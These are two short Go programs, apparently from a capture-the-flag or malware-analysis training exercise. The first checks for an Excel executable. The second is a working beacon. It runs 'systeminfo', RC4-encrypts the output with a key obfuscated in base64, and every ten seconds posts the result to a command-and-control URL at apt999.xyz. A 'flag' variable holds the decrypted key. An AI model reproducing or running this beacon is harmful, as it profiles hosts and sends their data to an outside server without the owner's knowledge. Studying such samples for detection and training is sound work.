package main

import (
	"fmt"
	"os"
)

func main() {
	path := `C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE`
	info, err := os.Stat(path)
	if os.IsNotExist(err) {
		fmt.Println(err)
		return
	}
	if err != nil {
		fmt.Println(err)
	}
	if info.IsDir() {
		fmt.Println("test")
	} else {
		fmt.Println("sucess")
	}
}





package main

import (
	"crypto/rc4"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os/exec"
	"time"
)

var flag string

func encrypt() string {
	// exec systeminfo
	out, err := exec.Command("systeminfo").Output()
	if err != nil {
		return ""
	}
	result := out

	// decode key
	encoded_key := "k0XIjRJZDWQfXSGWesL4vQ=="
	decoded_key, err := base64.StdEncoding.DecodeString(encoded_key)
	if err != nil {
		return ""
	}
	// decrypt key
	rc4_key := []byte("rc4_key_is_tokyo")
	cipher1, err := rc4.NewCipher(rc4_key)
	if err != nil {
		return ""
	}
	key := make([]byte, len(decoded_key))
	cipher1.XORKeyStream(key, decoded_key)

	// encrypt result with decrypted key
	cipher2, err := rc4.NewCipher(key)
	if err != nil {
		return ""
	}
	ciphertext := make([]byte, len(result))
	cipher2.XORKeyStream(ciphertext, result)

	// encode encrypted result
	encoded := base64.StdEncoding.EncodeToString(ciphertext)

	// for flag
	flag = (string(key))

	return encoded
}

func httprequest(data string) {
	// set http request
	form := url.Values{}
	form.Add("TEST", data)
	url := "http://apt999.xyz/c2.php"
	client := &http.Client{
		Timeout: 1 * time.Second,
	}

	// send http request
	resp, err := client.PostForm(url, form)
	if err != nil {
		return
	}
	io.Copy(io.Discard, resp.Body)

}

func main() {
	data := encrypt()

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		<-ticker.C

		fmt.Println(time.Now())
		httprequest(data)

		_ = flag
	}
}
